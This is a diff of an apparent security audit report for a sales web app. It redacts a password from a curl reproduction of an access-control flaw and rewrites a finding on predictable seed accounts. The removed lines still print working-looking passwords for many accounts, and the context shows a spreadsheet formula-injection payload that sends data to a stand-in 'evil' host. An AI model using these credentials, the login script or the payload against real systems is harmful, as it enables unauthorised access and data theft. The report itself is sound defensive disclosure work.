@@ -159,7 +159,7 @@ Sorted by severity, then by impact.
 curl -c jar.txt -s "$BASE/api/auth/csrf" -o csrf.json
 CSRF=$(cat csrf.json | python -c "import sys,json; print(json.load(sys.stdin)['csrfToken'])")
 curl -b jar.txt -c jar.txt -X POST "$BASE/api/auth/callback/credentials" \
-  -d "csrfToken=$CSRF&username=salesman.mct-01&password=Demo!2026Demo&callbackUrl=$BASE/"
+  -d "csrfToken=$CSRF&username=salesman.mct-01&password=[private credential]&callbackUrl=$BASE/"
 
 # Fetch a customer that is NOT on his route (Lulu Bethanyside, in Dhofar)
 curl -b jar.txt "$BASE/customers/cmoy9zjw20059tvf8dmknwt32"
@@ -411,9 +411,9 @@ Every re-upload of the Account Master sheet **resets every listed user's passwor
 
 `services/exports.ts:92-126` writes `legalName`, `notes`, `contactPerson` directly into Excel cells. None are prefix-escaped against `=`, `+`, `-`, `@`, tab, CR. A malicious customer-name like `=HYPERLINK("http://evil/?x="&A1)` exfiltrates data on open. With Office's Protected View, exploitation requires social engineering — but the export goes to managers and goes to ERP via copy-paste.
 
-### QA-022 — Demo credentials live with predictable passwords
+### SEC-11 — Predictable seed credentials
 
-The system has `salesman.mct-01` … `salesman.dhf-06` (38 accounts), `supervisor.1` … `supervisor.7`, `manager.a`, `manager.b`, `steward`, `viewer`, all with `Demo!2026Demo`. Admin uses `ChangeMeNow!2026`. Anyone who reads the build report or guesses the pattern has 50 valid logins.
+Predictable seed credentials recorded in source or documentation must be treated as exposed. Confirm current account inventory and credential state privately; this public report does not establish which accounts exist, have signed in or retain an initial password.
 
 ### QA-023 — `AUTH_SECRET` not validated at startup
 
